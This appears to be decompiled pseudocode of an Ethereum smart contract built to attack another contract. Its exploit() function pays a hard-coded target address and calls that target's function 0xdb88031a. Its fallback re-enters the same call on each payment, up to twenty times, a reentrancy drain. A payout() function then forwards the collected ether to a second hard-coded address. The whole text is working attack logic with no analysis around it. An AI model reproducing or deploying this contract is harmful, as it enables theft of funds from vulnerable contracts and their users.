contract main {


// =======================  Init code  ======================


address stor0;
address stor1;
uint256 stor3;
uint256 stor4;

function _fallback() payable {
    stor0 = 0xbf78025535c98f4c605fbe9eaf672999abf19dc1
    stor1 = 0x100c3ecf14aa1354598ce7bec42909b6e9e97243
    stor3 = 0
    stor4 = 0
    require not msg.value
    return code.data[208 len 789]
}



// =====================  Runtime code  =====================


address stor0;
address stor1;
address stor2;
uint256 stor3;
uint256 stor4;

function payout() {
    call stor1 with:
       value stor3 - 21000 wei
         gas 2300 * is_zero(value) wei
}

function _fallback() payable {
    stor3 += msg.value
    stor4++
    if stor4 >= 20:
    require ext_code.size(stor2)
    call stor2.0xdb88031a with:
         gas gas_remaining - 710 wei
    require ext_call.success
}

function exploit() payable {
    stor2 = stor0
    call stor2 with:
       value msg.value wei
         gas gas_remaining - 34710 wei
    require ext_code.size(stor2)
    call stor2.0xdb88031a with:
         gas gas_remaining - 710 wei
    require ext_call.success
}



}
